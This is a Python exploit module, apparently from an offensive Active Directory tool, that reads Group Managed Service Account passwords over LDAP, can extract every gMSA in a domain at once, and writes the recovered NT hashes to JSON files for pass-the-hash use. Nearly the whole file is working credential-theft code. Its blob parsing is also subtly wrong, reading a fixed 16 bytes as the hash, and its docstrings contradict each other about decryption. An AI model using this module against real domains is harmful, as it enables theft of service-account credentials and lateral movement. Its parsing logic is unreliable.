"""
Module: ReadGMSAPassword
=========================
Exploit the ReadGMSAPassword BloodHound edge. Group Managed Service
Accounts (gMSA) store their passwords in the msDS-ManagedPassword
attribute, encrypted with the KDS root key. Any principal with read
access to this attribute can decrypt and retrieve the plaintext
password.

gMSA passwords are typically used by:
  - IIS application pools
  - SQL Server services
  - Scheduled tasks
  - Other services that need a domain account

BloodHound Edge: ReadGMSAPassword
Attack Vector:   Read gMSA msDS-ManagedPassword to retrieve service credentials
Severity:        HIGH
"""

import json
import logging
import os
import struct
from typing import Any, Dict, List, Optional, Tuple

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.read_gmsa_password")


class ReadGMSAPassword(ExploitModule):
    """
    Read and decrypt Group Managed Service Account (gMSA) passwords
    from the msDS-ManagedPassword LDAP attribute.

    The password blob is a MSDS-MANAGEDPASSWORD_BLOB structure:
      - 16 bytes: version + reserved
      - 16 bytes: current password (UTF-16)
      - 16 bytes: previous password (UTF-16) [if available]
      - 16 bytes: next password (UTF-16) [if available]
      - 16 bytes: key material
      - ... followed by security descriptor

    Note: The password in the blob is actually the NT hash of the
    gMSA password (not the plaintext). To get the plaintext, you
    typically need the KDS root key, or you can use the NT hash
    directly for pass-the-hash attacks.
    """

    name: str            = "ReadGMSAPassword"
    description: str     = (
        "Read and parse the msDS-ManagedPassword attribute of a Group "
        "Managed Service Account (gMSA) to extract the stored password/NT "
        "hash. No special decryption is needed — the AD server returns the "
        "password blob if the principal has read access."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "ReadGMSAPassword"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword",
        "https://attack.mappings.mitre.org/technique/T1552/001/",
        "https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/",
        "https://www.rcesecurity.com/2021/03/attacking-active-directory-gmsa/",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target_gmsa",
            display_name="Target gMSA",
            description="SAM account name or DN of the target gMSA.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="output_file",
            display_name="Output File",
            description="Path to save the extracted credentials.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="extract_all",
            display_name="Extract All gMSAs",
            description="Instead of a specific target, enumerate and extract ALL gMSA passwords.",
            required=False,
            default=False,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    MSDS_MANAGEDPASSWORD_BLOB = struct.Struct(
        "<HHI I I I I 16s 16s 16s 16s"
    )
    """
    MSDS-MANAGEDPASSWORD_BLOB layout:
      Offset  Size  Field
      0x00    2     Version (2)
      0x02    2     Reserved
      0x04    4     CurrentPasswordOffset
      0x08    4     PreviousPasswordOffset
      0x0C    4     NextPasswordOffset
      0x10    4     QueryPasswordInterval
      0x14    4     UnchangedPasswordInterval
      0x18    16    CurrentPassword (UTF-16-LE)
      0x28    16    PreviousPassword (UTF-16-LE)
      0x38    16    NextPassword (UTF-16-LE)
      0x48    16    KeyMaterial
    Total header: 0x58 bytes (88 bytes)
    """

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_gmsa_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        """Resolve a gMSA name to its DN."""
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            # gMSA objects have msDS-GroupManagedServiceAccount = TRUE
            conn.search(
                search_base,
                f"(&(sAMAccountName={name})(objectClass=msDS-GroupManagedServiceAccount))",
                attributes=["distinguishedName"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
            # Fallback: search by CN
            conn.search(
                search_base,
                f"(&(cn={name})(objectClass=msDS-GroupManagedServiceAccount))",
                attributes=["distinguishedName"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("gMSA DN resolution failed: %s", exc)
        return None

    def _parse_gmsa_blob(self, blob_bytes: bytes) -> Dict[str, Any]:
        """
        Parse the msDS-ManagedPassword binary blob and extract
        password data.

        The blob contains UTF-16-LE encoded password fragments at
        the offsets specified in the header.
        """
        if len(blob_bytes) < 88:
            return {"error": "Blob too short", "raw_length": len(blob_bytes)}

        # Parse header
        version, reserved, cur_off, prev_off, next_off, qry_interval, unchanged_interval = struct.unpack_from(
            "<HHI I I I I", blob_bytes, 0
        )

        result = {
            "version": version,
            "current_password_offset": cur_off,
            "previous_password_offset": prev_off,
            "next_password_offset": next_off,
            "query_interval": qry_interval,
            "unchanged_interval": unchanged_interval,
        }

        # Current password — always at offset 0x18, length 16 bytes (UTF-16-LE)
        # The "password" in gMSA blob is actually the NT hash
        password_hash = blob_bytes[0x18:0x28]
        nt_hash = password_hash.hex()
        result["current_nt_hash"] = nt_hash

        # Try to decode as UTF-16-LE (some implementations store plaintext)
        try:
            # Strip null bytes and decode
            pwd_clean = password_hash.rstrip(b"\x00")
            if len(pwd_clean) >= 2:
                possible_plaintext = pwd_clean.decode("utf-16-le", errors="replace")
                if possible_plaintext.isprintable() and len(possible_plaintext) >= 6:
                    result["current_password_plaintext"] = possible_plaintext
        except Exception:
            pass

        # Previous password (if available)
        if prev_off > 0 and prev_off + 16 <= len(blob_bytes):
            prev_hash = blob_bytes[prev_off:prev_off + 16]
            result["previous_nt_hash"] = prev_hash.hex()

        # Next password (if available)
        if next_off > 0 and next_off + 16 <= len(blob_bytes):
            next_hash = blob_bytes[next_off:next_off + 16]
            result["next_nt_hash"] = next_hash.hex()

        return result

    def _enumerate_all_gmsas(self, search_base: str) -> List[Dict[str, Any]]:
        """Find all gMSA objects in the domain."""
        conn = self.connection
        gmsas = []
        try:
            conn.search(
                search_base,
                "(objectClass=msDS-GroupManagedServiceAccount)",
                attributes=["sAMAccountName", "distinguishedName", "msDS-ManagedPassword"],
            )
            for entry in conn.entries:
                gmsa_info = {
                    "sam_account_name": str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else "",
                    "dn": str(entry.distinguishedName),
                }
                # Try to read the managed password
                if hasattr(entry, "msDS-ManagedPassword") and entry.msDS_ManagedPassword.raw_values:
                    parsed = self._parse_gmsa_blob(entry.msDS_ManagedPassword.raw_values[0])
                    gmsa_info["password_data"] = parsed
                else:
                    gmsa_info["password_data"] = None
                gmsas.append(gmsa_info)
        except Exception as exc:
            self.logger.error("gMSA enumeration failed: %s", exc)
        return gmsas

    def _save_gmsa_creds(self, gmsa_data: Dict[str, Any], output_file: str) -> str:
        """Save extracted gMSA credentials to a JSON file."""
        output_dir = self.config.get("output_dir", os.getcwd())
        if not os.path.isabs(output_file):
            output_file = os.path.join(output_dir, output_file)

        os.makedirs(os.path.dirname(output_file) or output_dir, exist_ok=True)

        with open(output_file, "w") as f:
            json.dump({
                "tool": "Pharaohound",
                "module": "ReadGMSAPassword",
                "timestamp": __import__("datetime").datetime.utcnow().isoformat() + "Z",
                "accounts": gmsa_data if isinstance(gmsa_data, list) else [gmsa_data],
            }, f, indent=2)

        self.logger.info("gMSA credentials saved to %s", output_file)
        return output_file

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        extract_all = self._opt("extract_all", kwargs)
        target = self._opt("target_gmsa", kwargs)

        if not extract_all and not target:
            return False, "Either 'target_gmsa' or 'extract_all' is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        extract_all = self._opt("extract_all", kwargs)
        target = self._opt("target_gmsa", kwargs)
        domain = self._opt("domain", kwargs)
        output_file = self._opt("output_file", kwargs)

        if extract_all:
            return self._exploit_all(domain, output_file)
        else:
            return self._exploit_single(target, domain, output_file)

    def _exploit_single(
        self, target_name: str, domain: Optional[str], output_file: Optional[str]
    ) -> ExploitOutput:
        """Read the gMSA password for a single account."""
        conn = self.connection

        gmsa_dn = self._resolve_gmsa_dn(target_name, domain)
        if not gmsa_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot find gMSA '{target_name}' in LDAP.",
            )

        self.logger.info(
            "[ReadGMSAPassword] Reading msDS-ManagedPassword for '%s' ...", gmsa_dn
        )

        try:
            conn.search(
                gmsa_dn,
                "(objectClass=*)",
                attributes=["sAMAccountName", "msDS-ManagedPassword", "description", "member"],
            )
            if not conn.entries:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Cannot read gMSA object '{gmsa_dn}'.",
                )

            entry = conn.entries[0]
            sam = str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else target_name

            # Check if we got the password blob
            if not hasattr(entry, "msDS-ManagedPassword") or not entry.msDS_ManagedPassword.raw_values:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=(
                        f"No msDS-ManagedPassword returned for '{sam}'. "
                        f"Your principal likely lacks the ReadGMSAPassword right."
                    ),
                )

            # Parse the blob
            blob = entry.msDS_ManagedPassword.raw_values[0]
            parsed = self._parse_gmsa_blob(blob)

            gmsa_data = {
                "sam_account_name": sam,
                "dn": gmsa_dn,
                "password_data": parsed,
            }

            # Get allowed principals (who can use this gMSA)
            if hasattr(entry, "member") and entry.member.values:
                gmsa_data["principals_allowed_to_read"] = [
                    str(m) for m in entry.member.values
                ]

            # Save to file
            if not output_file:
                output_file = f"gmsa_{sam}.json"
            artifact = self._save_gmsa_creds(gmsa_data, output_file)

            nt_hash = parsed.get("current_nt_hash", "N/A")
            plaintext = parsed.get("current_password_plaintext")

            message = (
                f"Successfully read gMSA password for '{sam}'. "
                f"NT Hash: {nt_hash}"
            )
            if plaintext:
                message += f" | Possible plaintext: {plaintext}"

            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=message,
                data=gmsa_data,
                artifacts=[artifact],
            )

        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Failed to read gMSA password: {exc}",
            )

    def _exploit_all(
        self, domain: Optional[str], output_file: Optional[str]
    ) -> ExploitOutput:
        """Enumerate and extract ALL gMSA passwords in the domain."""
        search_base = self._get_search_base(domain)
        if not search_base:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="Cannot determine search base.",
            )

        self.logger.info("[ReadGMSAPassword] Enumerating all gMSAs in %s ...", search_base)
        gmsas = self._enumerate_all_gmsas(search_base)

        if not gmsas:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="No gMSA accounts found in the domain.",
            )

        readable = [g for g in gmsas if g["password_data"] is not None]
        denied = [g for g in gmsas if g["password_data"] is None]

        if not output_file:
            output_file = f"all_gmsa_passwords_{domain or 'domain'}.json"
        artifact = self._save_gmsa_creds(gmsas, output_file)

        message = (
            f"Found {len(gmsas)} gMSA account(s). "
            f"Successfully read {len(readable)} password(s), "
            f"denied for {len(denied)}."
        )

        return ExploitOutput(
            success=len(readable) > 0,
            result_type=ExploitResult.SUCCESS if readable else ExploitResult.FAILED,
            message=message,
            data={
                "total_gmsas": len(gmsas),
                "readable": len(readable),
                "denied": len(denied),
                "accounts": gmsas,
            },
            artifacts=[artifact],
        )

    # ------------------------------------------------------------------ #
    # Rollback — N/A
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not applicable (read-only credential extraction).",
        )
